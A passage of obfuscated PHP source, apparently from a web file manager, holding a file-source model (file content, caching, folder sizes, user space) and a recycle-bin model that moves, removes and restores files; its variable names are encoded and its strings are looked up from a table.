$_SERVER[γγάψ½]; $ζ••»ρ© = $this->fileInfoGet($Φν²θ°); if (!$ζ••»ρ©) { return !1; } if ($ζ••»ρ©[$ΟήυώΔ[79]] == 0) { return $ΟήυώΔ[12]; } $±ΦΚΩρΡ = $ΟήυώΔ[2310] . $ζ••»ρ©[$ΟήυώΔ[552]]; if ($ζ••»ρ©[$ΟήυώΔ[79]] <= 1024 * 10) { $’ν™Κκ© = Cache::get($±ΦΚΩρΡ); if (!$’ν™Κκ©) { $’ν™Κκ© = IO::getContent($ζ••»ρ©[$ΟήυώΔ[87]]); Cache::set($±ΦΚΩρΡ, $’ν™Κκ©); } return $’ν™Κκ©; } if (!$ζ••»ρ©[$ΟήυώΔ[87]]) { return $ΟήυώΔ[12]; } return IO::getContent($ζ••»ρ©[$ΟήυώΔ[87]]); } public function setDesc($ΌνΚμΖβ, $±ΥΕό΅λ) { $¨Ζ²Α— =& $_SERVER[γγάψ½]; Model($¨Ζ²Α—[641])->eventAddDesc($ΌνΚμΖβ, $±ΥΕό΅λ); return $this->metaSet($ΌνΚμΖβ, $¨Ζ²Α—[529], $±ΥΕό΅λ); } public function setContent($›·έΰ°, $ΔξΙετ = '') { $¥ΙξΓ‚σ =& $_SERVER[γγάψ½]; $Ι©Ζ  = $this->sourceInfo($›·έΰ°); $‘¨πΘΤ‘ = $this->fileInfoGet($›·έΰ°); if (!$‘¨πΘΤ‘ || !$Ι©Ζ ) { return !1; } $¶§ΜΣ¥Ζ = KodIO::ioFileDriverGet($¥ΙξΓ‚σ[486] . $›·έΰ° . $¥ΙξΓ‚σ[405]); $›€Ψ΄η = Model($¥ΙξΓ‚σ[549])->addFileByContent($ΔξΙετ, $¶§ΜΣ¥Ζ, $Ι©Ζ [$¥ΙξΓ‚σ[32]]); if (!$›€Ψ΄η) { return !1; } $γΓ‡— = $this->fileHistory($Ι©Ζ , $›€Ψ΄η[$¥ΙξΓ‚σ[546]], $›€Ψ΄η[$¥ΙξΓ‚σ[79]]); if (!$γΓ‡—) { return Model($¥ΙξΓ‚σ[549])->remove($›€Ψ΄η[$¥ΙξΓ‚σ[546]]); } $this->folderSizeReset($Ι©Ζ [$¥ΙξΓ‚σ[193]]); return !0; } public function fileSubstr($ι“άϋΠΉ, $™«¥Ρψν, $υ»¶ύϋΨ) { $‹όΔΛ‚ = $this->fileInfoGet($ι“άϋΠΉ); if (!$‹όΔΛ‚) { return !1; } return IO::fileSubstr($‹όΔΛ‚[$_SERVER[γγάψ½][87]], $™«¥Ρψν, $υ»¶ύϋΨ); } public function fileInfoGet($½Σρ…δ) { $έ²Ο‰ =& $_SERVER[γγάψ½]; $βΪΡ±§ = $this->sourceInfo($½Σρ…δ); if (!$βΪΡ±§ || $βΪΡ±§[$έ²Ο‰[488]]) { return !1; } $Β§ƒν– = $έ²Ο‰[553] . $βΪΡ±§[$έ²Ο‰[546]]; $Δ‡¬Ί = _get(self::$cacheFileInfo, $Β§ƒν–); if ($Δ‡¬Ί) { return $Δ‡¬Ί; } $ΒΒΐ›Βζ = Model($έ²Ο‰[549])->fileInfo($βΪΡ±§[$έ²Ο‰[546]]); if ($ΒΒΐ›Βζ) { $ΒΒΐ›Βζ[$έ²Ο‰[32]] = $βΪΡ±§[$έ²Ο‰[32]]; } self::$cacheFileInfo[$Β§ƒν–] = $ΒΒΐ›Βζ; return $ΒΒΐ›Βζ; } private function folderChildrenNumber($ζΫώ®) { $έύ·ϊΜ =& $_SERVER[γγάψ½]; $ζ¦π³Ο = $this->sourceInfo($ζΫώ®); $Ψ‚ΰ²Ν = array($έύ·ϊΜ[660] => array($έύ·ϊΜ[620], $ζ¦π³Ο[$έύ·ϊΜ[589]] . $ζΫώ® . $έύ·ϊΜ[621]), $έύ·ϊΜ[657] => $ζ¦π³Ο[$έύ·ϊΜ[574]], $έύ·ϊΜ[507] => intval($ζ¦π³Ο[$έύ·ϊΜ[508]]), $έύ·ϊΜ[654] => 1); $„Ώ« = $this->where($Ψ‚ΰ²Ν)->count(); $ΝΤ³¥ρ« = $this->where($Ψ‚ΰ²Ν)->where(array($έύ·ϊΜ[654] => 0))->count(); return array($έύ·ϊΜ[83] => $ΝΤ³¥ρ«, $έύ·ϊΜ[84] => $„Ώ«); } public function pathInfo($Δη™δβμ, $―γ€δΧ = false) { $‹δΗΑ΅ =& $_SERVER[γγάψ½]; $―γ€δΧ = !1; $Δη™δβμ = intval($Δη™δβμ); $ύλέΔΏ = $‹δΗΑ΅[537] . intval($―γ€δΧ) . $‹δΗΑ΅[465] . $Δη™δβμ; $½‰—Κ¦υ = _get(self::$cachePathInfo, $ύλέΔΏ); if ($½‰—Κ¦υ) { return $½‰—Κ¦υ; } $ρβ‡ΠΣ = $this->sourceInfo($Δη™δβμ); if (!$ρβ‡ΠΣ) { return !1; } $ρβ‡ΠΣ = $this->_listDataApplyItem($ρβ‡ΠΣ, $―γ€δΧ); self::$cachePathInfo[$ύλέΔΏ] = $ρβ‡ΠΣ; return $ρβ‡ΠΣ; } public static $cachePathInfoMore = array(); public function pathInfoMore($§ΣΘ‡ΥΘ) { $‘ΊΞ›ΰ =& $_SERVER[γγάψ½]; $ή‡¬υ¤ = _get(self::$cachePathInfoMore, $§ΣΘ‡ΥΘ); if ($ή‡¬υ¤) { return $ή‡¬υ¤; } $Τ¶ƒ¦ = $this->pathInfo($§ΣΘ‡ΥΘ); if (!$Τ¶ƒ¦) { return !1; } if ($Τ¶ƒ¦[$‘ΊΞ›ΰ[488]] == $‘ΊΞ›ΰ[91]) { $Τ¶ƒ¦[$‘ΊΞ›ΰ[82]] = $this->folderChildrenNumber($§ΣΘ‡ΥΘ); } self::$cachePathInfoMore[$§ΣΘ‡ΥΘ] = $Τ¶ƒ¦; return $Τ¶ƒ¦; } public function sourceInfo($ρ¬‹φβΔ) { $¶Μ¥ΣΖχ =& $_SERVER[γγάψ½]; if (!$ρ¬‹φβΔ) { return array(); } $ρ¬‹φβΔ = intval($ρ¬‹φβΔ); $ξ΅Σ“λ = $¶Μ¥ΣΖχ[536] . $ρ¬‹φβΔ; $υ»ΊΜ› = _get(self::$cacheSourceInfo, $ξ΅Σ“λ); if ($υ»ΊΜ›) { return $υ»ΊΜ›; } $ΫΒΉ΅ = $this->where(array($¶Μ¥ΣΖχ[194] => $ρ¬‹φβΔ))->find(); self::$cacheSourceInfo[$ξ΅Σ“λ] = $ΫΒΉ΅; return self::$cacheSourceInfo[$ξ΅Σ“λ]; } public function sourceCacheClear($ςΊΩΏ’ = false) { self::cacheClear($ςΊΩΏ’); } public static function cacheClear($ΏΔ―Ψ· = false) { $ρΣω΄Ι =& $_SERVER[γγάψ½]; if ($ΏΔ―Ψ· == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ρΣω΄Ι[536] . $ΏΔ―Ψ·]); unset(self::$cachePathInfoMore[$ΏΔ―Ψ·]); unset(self::$cachePathInfo[$ρΣω΄Ι[2311] . $ΏΔ―Ψ·]); unset(self::$cachePathInfo[$ρΣω΄Ι[2312] . $ΏΔ―Ψ·]); } public function metaSet($ζύύΠκ, $‘“δ•„¥ = null, $ΏΗΫΠ = null) { $ΜίΝί = parent::metaSet($ζύύΠκ, $‘“δ•„¥, $ΏΗΫΠ); if ($ΜίΝί) { $this->sourceCacheClear($ζύύΠκ); } return $ΜίΝί; } public function pathInfoByPath($ν“²Σδύ, $Ι³΄Φ­) { $ΘΦι·Γ =& $_SERVER[γγάψ½]; $ώςΑ– = !$Ι³΄Φ­ ? array() : explode($ΘΦι·Γ[8], trim($Ι³΄Φ­, $ΘΦι·Γ[8])); $΅•²–―Δ = $ν“²Σδύ; foreach ($ώςΑ– as $Νβ΄†Λ«) { $Ύφ“Η¤ = array($ΘΦι·Γ[193] => $΅•²–―Δ, $ΘΦι·Γ[32] => $Νβ΄†Λ«); $•…µφΨ = $this->field($ΘΦι·Γ[2313])->where($Ύφ“Η¤)->select(); if (!$•…µφΨ) { return !1; } $•…µφΨ = array_sort_by($•…µφΨ, $ΘΦι·Γ[508]); $΅•²–―Δ = $•…µφΨ[0][$ΘΦι·Γ[194]]; } $”μτΩνΗ = $this->sourceInfo($΅•²–―Δ); $this->pathInfoFilter($”μτΩνΗ); return $”μτΩνΗ; } protected function updateModifyTime($ΓΣΩΠΪ‹) { $ΏΥ΅Ρ• =& $_SERVER[γγάψ½]; $Ϋ™Ζ¤‡ = defined($ΏΥ΅Ρ•[2221]) ? USER_ID : 0; if (!$ΓΣΩΠΪ‹) { return; } if (!is_array($ΓΣΩΠΪ‹)) { $ΓΣΩΠΪ‹ = array($ΓΣΩΠΪ‹); } foreach ($ΓΣΩΠΪ‹ as $ΉΗΑό => $ά…ζπ΄‚) { $ΓΣΩΠΪ‹[$ΉΗΑό] = intval($ά…ζπ΄‚); $this->sourceCacheClear($ά…ζπ΄‚); } $β…Ρδ¤• = array($ΏΥ΅Ρ•[194] => array($ΏΥ΅Ρ•[7], $ΓΣΩΠΪ‹)); $µ†‘έΓ = array($ΏΥ΅Ρ•[659] => $Ϋ™Ζ¤‡, $ΏΥ΅Ρ•[501] => time()); $this->where($β…Ρδ¤•)->save($µ†‘έΓ); } public function folderSizeReset($ύΫς«Ά, $θ°ϊ¥§Π = false) { $€Ώ®Σ»ΐ =& $_SERVER[γγάψ½]; if ($this->statusIgnoreResetSpace) { return; } $Ϋη‹–θ’ = $this->sourceInfo($ύΫς«Ά); $¦—όύΓ = $€Ώ®Σ»ΐ[2314] . $ύΫς«Ά; CacheLock::lock($¦—όύΓ, 20); if ($θ°ϊ¥§Π === !1) { $this->sourceCacheClear($ύΫς«Ά); $Ϋη‹–θ’ = $this->sourceInfo($ύΫς«Ά); $£γ„”Β = array($€Ώ®Σ»ΐ[480] => $ύΫς«Ά, $€Ώ®Σ»ΐ[507] => 0); $ΞΑ¨ς = $this->where($£γ„”Β)->sum($€Ώ®Σ»ΐ[79]); $θ°ϊ¥§Π = intval($ΞΑ¨ς) - intval($Ϋη‹–θ’[$€Ώ®Σ»ΐ[79]]); } if ($θ°ϊ¥§Π == 0) { return CacheLock::unlock($¦—όύΓ); } $‘ΚΪέά = $this->parentLevelArray($Ϋη‹–θ’[$€Ώ®Σ»ΐ[589]]); if (!$‘ΚΪέά) { $‘ΚΪέά = array(); } $‘ΚΪέά[] = $Ϋη‹–θ’[$€Ώ®Σ»ΐ[194]]; $£γ„”Β = array($€Ώ®Σ»ΐ[194] => array($€Ώ®Σ»ΐ[495], $‘ΚΪέά)); if ($θ°ϊ¥§Π < 0) { $£γ„”Β[$€Ώ®Σ»ΐ[79]] = array($€Ώ®Σ»ΐ[1101], abs($θ°ϊ¥§Π)); } $this->where($£γ„”Β)->setAdd($€Ώ®Σ»ΐ[79], $θ°ϊ¥§Π); CacheLock::unlock($¦—όύΓ); $Ε°“―έ = $€Ώ®Σ»ΐ[2315] . $Ϋη‹–θ’[$€Ώ®Σ»ΐ[191]] . $€Ώ®Σ»ΐ[4] . $Ϋη‹–θ’[$€Ώ®Σ»ΐ[574]]; $¥ύ’πσΥ = array($Ϋη‹–θ’[$€Ώ®Σ»ΐ[191]], $Ϋη‹–θ’[$€Ώ®Σ»ΐ[574]]); TaskRun::timeLimitCall($Ε°“―έ, $€Ώ®Σ»ΐ[2316], $¥ύ’πσΥ, 1.5); } public function folderSizeResetChildren($φΫ¨ςϊξ) { $ηΨΕάΑ =& $_SERVER[γγάψ½]; $this->sourceCacheClear($φΫ¨ςϊξ); $νκΪ‡Ωκ = $this->sourceInfo($φΫ¨ςϊξ); $ϊ ΥοΕΕ = array($ηΨΕάΑ[654] => 1, $ηΨΕάΑ[657] => $νκΪ‡Ωκ[$ηΨΕάΑ[574]], $ηΨΕάΑ[660] => array($ηΨΕάΑ[620], $νκΪ‡Ωκ[$ηΨΕάΑ[589]] . $φΫ¨ςϊξ . $ηΨΕάΑ[621])); $¶θ‚ςΜκ = $ηΨΕάΑ[2317]; $ΑιΗΈσϋ = $this->field($¶θ‚ςΜκ)->where($ϊ ΥοΕΕ)->select(); $ϊ ΥοΕΕ[$ηΨΕάΑ[488]] = 0; $γο¨ΛωΝ = $this->field($¶θ‚ςΜκ)->where($ϊ ΥοΕΕ)->select(); if (!$γο¨ΛωΝ) { return; } $ΑιΗΈσϋ[] = $νκΪ‡Ωκ; $ΑιΗΈσϋ = array_to_keyvalue($ΑιΗΈσϋ, $ηΨΕάΑ[194]); foreach ($ΑιΗΈσϋ as $‘£ΝΙΩ => $φΓ‚Ι¬) { $ΑιΗΈσϋ[$‘£ΝΙΩ][$ηΨΕάΑ[2318]] = $ΑιΗΈσϋ[$‘£ΝΙΩ][$ηΨΕάΑ[79]]; $ΑιΗΈσϋ[$‘£ΝΙΩ][$ηΨΕάΑ[79]] = 0; } foreach ($γο¨ΛωΝ as $φΓ‚Ι¬) { $‹†ΓψΛΥ = $φΓ‚Ι¬[$ηΨΕάΑ[193]] . $ηΨΕάΑ[12]; if (!isset($ΑιΗΈσϋ[$‹†ΓψΛΥ])) { continue; } if ($φΓ‚Ι¬[$ηΨΕάΑ[508]] == $ΑιΗΈσϋ[$‹†ΓψΛΥ][$ηΨΕάΑ[508]]) { $ΑιΗΈσϋ[$‹†ΓψΛΥ][$ηΨΕάΑ[79]] += $φΓ‚Ι¬[$ηΨΕάΑ[79]]; } } foreach ($ΑιΗΈσϋ as $φΓ‚Ι¬) { $—ο²™ηΩ = $this->parentLevelArray($φΓ‚Ι¬[$ηΨΕάΑ[589]]); foreach ($—ο²™ηΩ as $‹†ΓψΛΥ) { $‹†ΓψΛΥ = $‹†ΓψΛΥ . $ηΨΕάΑ[12]; if (!isset($ΑιΗΈσϋ[$‹†ΓψΛΥ])) { continue; } if ($φΓ‚Ι¬[$ηΨΕάΑ[508]] == $ΑιΗΈσϋ[$‹†ΓψΛΥ][$ηΨΕάΑ[508]]) { $ΑιΗΈσϋ[$‹†ΓψΛΥ][$ηΨΕάΑ[79]] += $φΓ‚Ι¬[$ηΨΕάΑ[79]]; } } } $Ξα“ύΧύ = array(); foreach ($ΑιΗΈσϋ as $φΓ‚Ι¬) { if ($φΓ‚Ι¬[$ηΨΕάΑ[79]] == $φΓ‚Ι¬[$ηΨΕάΑ[2318]]) { continue; } $Ξα“ύΧύ[] = array($ηΨΕάΑ[194], $φΓ‚Ι¬[$ηΨΕάΑ[194]], $ηΨΕάΑ[79], $φΓ‚Ι¬[$ηΨΕάΑ[79]]); } $this->saveAll($Ξα“ύΧύ); } public function userSpaceReset($™ώΑξέΠ = false) { $µ¨μρΨ± =& $_SERVER[γγάψ½]; $τΐνβ = $this->where(array($µ¨μρΨ±[191] => self::TYPE_USER, $µ¨μρΨ±[574] => $™ώΑξέΠ, $µ¨μρΨ±[488] => 0))->sum($µ¨μρΨ±[79]); $τΐνβ = !$τΐνβ || $τΐνβ <= 0 ? 0 : $τΐνβ; Model($µ¨μρΨ±[582])->userEdit($™ώΑξέΠ, array($µ¨μρΨ±[1982] => $τΐνβ)); } public function targetSpaceUpdate($Ρ°½ΎΑ, $¶±ϋΛά½) { $ϊώύε»• =& $_SERVER[γγάψ½]; if (!$¶±ϋΛά½) { return; } if (!in_array($Ρ°½ΎΑ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ρΤ―ΗΔβ = $this->targetSpaceSize($Ρ°½ΎΑ, $¶±ϋΛά½); if ($Ρ°½ΎΑ == self::TYPE_USER) { Model($ϊώύε»•[582])->userEdit($¶±ϋΛά½, array($ϊώύε»•[1982] => $ρΤ―ΗΔβ)); } else { if ($Ρ°½ΎΑ == self::TYPE_GROUP) { Model($ϊώύε»•[590])->groupEdit($¶±ϋΛά½, array($ϊώύε»•[1982] => $ρΤ―ΗΔβ)); } } } public function targetSpaceSize($ΈχΠ, $΅α’²“ω) { $›φώ =& $_SERVER[γγάψ½]; $ϊΡ›σ = 0; $°ƒ²ΰ… = $this->targetSourceRoot($ΈχΠ, $΅α’²“ω, !0); foreach ($°ƒ²ΰ… as $µ·°ΰ΄§) { if (!$µ·°ΰ΄§) { continue; } $ϊΡ›σ += floatval($µ·°ΰ΄§[$›φώ[79]]); $ός―¨ώψ = array($›φώ[660] => array($›φώ[620], $›φώ[598] . $µ·°ΰ΄§[$›φώ[194]] . $›φώ[621])); $λ”ς½• = Model($›φώ[506])->field($›φώ[494])->where($ός―¨ώψ)->select(); $λ”ς½• = array_to_keyvalue($λ”ς½•, $›φώ[12], $›φώ[194]); $λ”ς½• = array_unique(array_filter($λ”ς½•)); if ($λ”ς½•) { $ός―¨ώψ = array($›φώ[494] => array($›φώ[495], $λ”ς½•)); $ϊΡ›σ += floatval($this->where($ός―¨ώψ)->sum($›φώ[79])); } } $ϊΡ›σ = !$ϊΡ›σ || $ϊΡ›σ <= 0 ? 0 : $ϊΡ›σ; return $ϊΡ›σ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($®ναΙΕ±) { return $this->fileTypeProfile($®ναΙΕ±, SourceModel::TYPE_USER); } public function groupFileTypeProfile($›ΔΙψάΞ) { return $this->fileTypeProfile($›ΔΙψάΞ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($η®¦νΐ, $ξ¶°ωƒ) { $ιΫΩΌ― =& $_SERVER[γγάψ½]; $‹™‚―Σ = $ιΫΩΌ―[2319] . $η®¦νΐ . $ιΫΩΌ―[11] . $ξ¶°ωƒ; $‚¬΅ΔθΪ = Cache::get($‹™‚―Σ); if ($‚¬΅ΔθΪ) { return $‚¬΅ΔθΪ; } $ΐΕδ°Ψ† = array($ιΫΩΌ―[654] => 0); if ($η®¦νΐ != !1) { $ΐΕδ°Ψ†[$ιΫΩΌ―[574]] = $η®¦νΐ; $ΐΕδ°Ψ†[$ιΫΩΌ―[191]] = $ξ¶°ωƒ; } $ΖπΎπγ“ = array(); $ΖπΎπγ“[$ιΫΩΌ―[2320]] = array($ιΫΩΌ―[2321] => LNG($ιΫΩΌ―[2320]), $ιΫΩΌ―[2322] => $this->where($ΐΕδ°Ψ†)->count(), $ιΫΩΌ―[625] => $this->where($ΐΕδ°Ψ†)->sum($ιΫΩΌ―[79])); $«΄Ξ … = KodIO::fileTypeList(); foreach ($«΄Ξ … as $χΝΣΥ‰ => $ομΈ±) { $ΐΕδ°Ψ†[$ιΫΩΌ―[489]] = $this->fileTypeWhere($χΝΣΥ‰); $ΖπΎπγ“[$χΝΣΥ‰] = array($ιΫΩΌ―[2321] => $ομΈ±[$ιΫΩΌ―[32]], $ιΫΩΌ―[2322] => $this->where($ΐΕδ°Ψ†)->count(), $ιΫΩΌ―[625] => $this->where($ΐΕδ°Ψ†)->sum($ιΫΩΌ―[79])); } Cache::set($‹™‚―Σ, $ΖπΎπγ“, 1200); return $ΖπΎπγ“; } public function fileNameExist($Φύ©¦ξ‡, $•™α”) { $®ΞΗν΄ =& $_SERVER[γγάψ½]; $Γ΄¶΄Χ = $this->field($®ΞΗν΄[2323])->where(array($®ΞΗν΄[193] => $Φύ©¦ξ‡, $®ΞΗν΄[32] => $•™α”, $®ΞΗν΄[508] => 0))->find(); return is_array($Γ΄¶΄Χ) ? $Γ΄¶΄Χ[$®ΞΗν΄[194]] : !1; } public function childList($ΐ³θµΑΦ) { $υµύ‚–µ =& $_SERVER[γγάψ½]; $΄οµα = $υµύ‚–µ[2296] . $ΐ³θµΑΦ; if (isset(self::$cacheChildList[$΄οµα])) { return self::$cacheChildList[$΄οµα]; } $ρ‚™€ϊ = array($υµύ‚–µ[193] => intval($ΐ³θµΑΦ), $υµύ‚–µ[508] => 0); $ϊµήν…Ϋ = $this->where($ρ‚™€ϊ)->select(); $ϊµήν…Ϋ = $ϊµήν…Ϋ ? $ϊµήν…Ϋ : array(); self::$cacheChildList[$΄οµα] = $ϊµήν…Ϋ; foreach ($ϊµήν…Ϋ as $Σε΅Ξ”υ) { $΄οµα = $υµύ‚–µ[536] . $Σε΅Ξ”υ[$υµύ‚–µ[194]]; self::$cacheSourceInfo[$΄οµα] = $Σε΅Ξ”υ; } return $ϊµήν…Ϋ; } public function fileNameAuto($›αµΘ, $Ν”Σ‡‘, $‘Εχ… = REPEAT_RENAME, $Όω®ή«Λ = false) { $ΨΠ§‘¦Ϊ =& $_SERVER[γγάψ½]; $€ΤΡθ¶ = get_path_ext($Ν”Σ‡‘); $†μΊΕσΚ = $€ΤΡθ¶ ? get_path_ext_name($Ν”Σ‡‘) . $ΨΠ§‘¦Ϊ[2324] . $€ΤΡθ¶ : $Ν”Σ‡‘ . $ΨΠ§‘¦Ϊ[463]; $Χ‹β°§ = array($ΨΠ§‘¦Ϊ[193] => $›αµΘ, $ΨΠ§‘¦Ϊ[508] => 0, $ΨΠ§‘¦Ϊ[32] => array($ΨΠ§‘¦Ϊ[462], $†μΊΕσΚ)); $Τ›έζ¬ς = $this->field($ΨΠ§‘¦Ϊ[32])->where($Χ‹β°§)->select(); $™·η‹χ = array_to_keyvalue($Τ›έζ¬ς, $ΨΠ§‘¦Ϊ[12], $ΨΠ§‘¦Ϊ[32]); return $this->fileNameAutoGet($™·η‹χ, $Ν”Σ‡‘, $‘Εχ…, $Όω®ή«Λ); } public function fileNameAutoGet($ΐγ•ζΤΖ, $κΤ —ΫΏ, $λΫμΔΐΊ, $™¦°―Ύ) { $αΞ¦χ» =& $_SERVER[γγάψ½]; if ($λΫμΔΐΊ == REPEAT_REPLACE || !$ΐγ•ζΤΖ || !in_array_not_case($κΤ —ΫΏ, $ΐγ•ζΤΖ) || $™¦°―Ύ && $λΫμΔΐΊ != REPEAT_RENAME_FOLDER) { return $κΤ —ΫΏ; } if ($λΫμΔΐΊ == REPEAT_SKIP) { return !1; } $Εϊ ‰­ = $αΞ¦χ»[10] . get_path_ext($κΤ —ΫΏ); $Εϊ ‰­ = $Εϊ ‰­ == $αΞ¦χ»[10] || $™¦°―Ύ ? $αΞ¦χ»[12] : $Εϊ ‰­; for ($—ΣΟ©Χ = 1; $—ΣΟ©Χ <= count($ΐγ•ζΤΖ) + 1; $—ΣΟ©Χ++) { $φΔ‘Άύρ = substr($κΤ —ΫΏ, 0, strlen($κΤ —ΫΏ) - strlen($Εϊ ‰­)); $½•φ΄ό = $φΔ‘Άύρ . "\x28{$—ΣΟ©Χ}\51{$Εϊ ‰­}"; if (!in_array_not_case($½•φ΄ό, $ΐγ•ζΤΖ)) { return $½•φ΄ό; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\x75\x72\143\x65\x5f\x72\x65\x63\171\x63\x6c\145"; protected $dataAuto = array(array("\x63\162\x65\x61\164\x65\124\151\x6d\145", "\164\x69\x6d\x65", "\151\156\x73\145\x72\164", "\x66\165\156\x63\164\151\157\156")); public function listData($Τ±ρήχε = false) { $ΏΠξ—³ =& $_SERVER[γγάψ½]; $Τ±ρήχε = $Τ±ρήχε ? $Τ±ρήχε : USER_ID; $φϋύ€κΉ = $this->where(array($ΏΠξ—³[1784] => $Τ±ρήχε))->select(); return array_to_keyvalue($φϋύ€κΉ, $ΏΠξ—³[12], $ΏΠξ—³[194]); } public function moveToRecycle($Ω•…ƒµΒ) { $³πς΄” =& $_SERVER[γγάψ½]; $άΤΑ = Model($³πς΄”[1439]); $•’³η = $άΤΑ->sourceInfo($Ω•…ƒµΒ); if (!$•’³η || $•’³η[$³πς΄”[508]] == $³πς΄”[91]) { return; } $‹η•†ΰ = array($³πς΄”[494] => $Ω•…ƒµΒ, $³πς΄”[1784] => USER_ID, $³πς΄”[656] => $•’³η[$³πς΄”[191]], $³πς΄”[657] => $•’³η[$³πς΄”[574]], $³πς΄”[660] => $•’³η[$³πς΄”[589]]); $this->add($‹η•†ΰ); $this->recycleMove($Ω•…ƒµΒ, 1); if ($•’³η[$³πς΄”[488]] == $³πς΄”[91]) { $¶Ρ£ Ι = array($³πς΄”[660] => array($³πς΄”[620], $•’³η[$³πς΄”[589]] . $Ω•…ƒµΒ . $³πς΄”[621])); $άΤΑ->where($¶Ρ£ Ι)->setField($³πς΄”[508], 1); } } public function clear() { $this->remove(!1); } public function remove($ζΎ–Ήυ… = false, $―ητΈ = false) { $ΝτΖΉΪ =& $_SERVER[γγάψ½]; $―ητΈ = $―ητΈ ? $―ητΈ : USER_ID; $Ής«ρ¨π = Model($ΝτΖΉΪ[1439]); $Χφ„ƒΆ΄ = $this->listData($―ητΈ); $ζΎ–Ήυ… = $ζΎ–Ήυ… === !1 ? !1 : $ζΎ–Ήυ…; $ψα°—Ύ = array(); foreach ($Χφ„ƒΆ΄ as $½±‘–•) { if ($ζΎ–Ήυ… != !1 && !in_array($½±‘–•, $ζΎ–Ήυ…)) { continue; } $’¥κχΣΩ = $Ής«ρ¨π->sourceInfo($½±‘–•); $Ής«ρ¨π->remove($½±‘–•, !1); $Ν±€ΡΎ = $’¥κχΣΩ[$ΝτΖΉΪ[191]] . $ΝτΖΉΪ[11] . $’¥κχΣΩ[$ΝτΖΉΪ[574]]; $ψα°—Ύ[$Ν±€ΡΎ] = array($ΝτΖΉΪ[656] => $’¥κχΣΩ[$ΝτΖΉΪ[191]], $ΝτΖΉΪ[574] => $’¥κχΣΩ[$ΝτΖΉΪ[574]]); $this->where(array($ΝτΖΉΪ[194] => $½±‘–•))->delete(); } foreach ($ψα°—Ύ as $ƒ¤®€ϋ—) { $Ής«ρ¨π->targetSpaceUpdate($ƒ¤®€ϋ—[$ΝτΖΉΪ[191]], $ƒ¤®€ϋ—[$ΝτΖΉΪ[574]]); } } public function restore($ΰίϊπΚΕ = false) { $ΦσΦΛ = $this->listData(); $this->_restoreSource($ΦσΦΛ, $ΰίϊπΚΕ); } public function removeUserAll($αΑΔ±Χ) { $this->remove(!1, $αΑΔ±Χ); } public function restoreItem($ΔΧ„ζΊΘ) { $this->_restoreSource(array($ΔΧ„ζΊΘ), array($ΔΧ„ζΊΘ)); } private function _restoreSource($Φ—Ε‘δ, $ό¦ε£ε“) { $ΤΛΏέ›ΐ =& $_SERVER[γγάψ½]; $Θ¥Πξη = Model($ΤΛΏέ›ΐ[1439]); $ό¦ε£ε“ = $ό¦ε£ε“ == !1 ? !1 : $ό¦ε£ε“; if (!$Φ—Ε‘δ) { return !0; } $ΌΓϋ’Ή™ = array(); foreach ($Φ—Ε‘δ as $Δ½ΊΑμ) { if ($ό¦ε£ε“ != !1 && !in_array($Δ½ΊΑμ, $ό¦ε£ε“)) { continue; } $ΠέΆ΄η = $Θ¥Πξη->sourceInfo($Δ½ΊΑμ); $ΕυΦ…΅ = $Θ¥Πξη->sourceInfo($ΠέΆ΄η[$ΤΛΏέ›ΐ[193]]); if ($ΕυΦ…΅[$ΤΛΏέ›ΐ[508]] == $ΤΛΏέ›ΐ[91]) { continue; } $Θ¥Πξη->lockMoveStart($Δ½ΊΑμ); $this->recycleMove($Δ½ΊΑμ, 0); if ($ΠέΆ΄η[$ΤΛΏέ›ΐ[488]] == $ΤΛΏέ›ΐ[91]) { $„ρ¥ƒ°” = array($ΤΛΏέ›ΐ[660] => array($ΤΛΏέ›ΐ[620], $ΠέΆ΄η[$ΤΛΏέ›ΐ[589]] . $Δ½ΊΑμ . $ΤΛΏέ›ΐ[621])); $Θ¥Πξη->where($„ρ¥ƒ°”)->setField($ΤΛΏέ›ΐ[508], 0); $this->restoreFolderChildren($Δ½ΊΑμ, $Φ—Ε‘δ); } $this->where(array($ΤΛΏέ›ΐ[194] => $Δ½ΊΑμ))->delete(); $Θ¥Πξη->folderSizeReset($ΠέΆ΄η[$ΤΛΏέ›ΐ[193]]); $ΌΓϋ’Ή™[] = $ΠέΆ΄η[$ΤΛΏέ›ΐ[193]]; if ($ΠέΆ΄η[$ΤΛΏέ›ΐ[488]] == $ΤΛΏέ›ΐ[91]) { $ΌΓϋ’Ή™[] = $Δ½ΊΑμ; } $Θ¥Πξη->lockMoveEnd($Δ½ΊΑμ); } $Θ¥Πξη->updateModifyTime($ΌΓϋ’Ή™); } private function restoreFolderChildren($ύΥ¶«ΐ, $ό½έΠ‹) { $κΦ³ώΕ =& $_SERVER[γγάψ½]; $¨±…Ν―– = Model($κΦ³ώΕ[1439]); $€‡ο®ΰ = array($κΦ³ώΕ[194] => array($κΦ³ώΕ[7], array())); foreach ($ό½έΠ‹ as $Ζ—΅ύΎ§) { if ($Ζ—΅ύΎ§ == $ύΥ¶«ΐ) { continue; } if (!$¨±…Ν―–->isParentOf($ύΥ¶«ΐ, $Ζ—΅ύΎ§)) { continue; } $·™ΰΡΓζ = $¨±…Ν―–->sourceInfo($Ζ—΅ύΎ§); if ($·™ΰΡΓζ[$κΦ³ώΕ[488]] == $κΦ³ώΕ[91]) { $€‡ο®ΰ[] = array($κΦ³ώΕ[660] => array($κΦ³ώΕ[620], $·™ΰΡΓζ[$κΦ³ώΕ[589]] . $Ζ—΅ύΎ§ . $κΦ³ώΕ[621])); } else { $€‡ο®ΰ[$κΦ³ώΕ[194]][1][] = $Ζ—΅ύΎ§; } } if (!$€‡ο®ΰ[$κΦ³ώΕ[194]][1]) { unset($€‡ο®ΰ[$κΦ³ώΕ[194]]); } if (!$€‡ο®ΰ) { return; } if (is_array($€‡ο®ΰ[$κΦ³ώΕ[194]]) && is_array($€‡ο®ΰ[$κΦ³ώΕ[194]][1])) { $€‡ο®ΰ[$κΦ³ώΕ[194]][1] = array_unique($€‡ο®ΰ[$κΦ³ώΕ[194]][1]); } $€‡ο®ΰ[$κΦ³ώΕ[1086]] = $κΦ³ώΕ[2096]; $¨±…Ν―–->where($€‡ο®ΰ)->setField($κΦ³ώΕ[508], 1); } private function recycleMove($§ΤΩΌΒ΄, 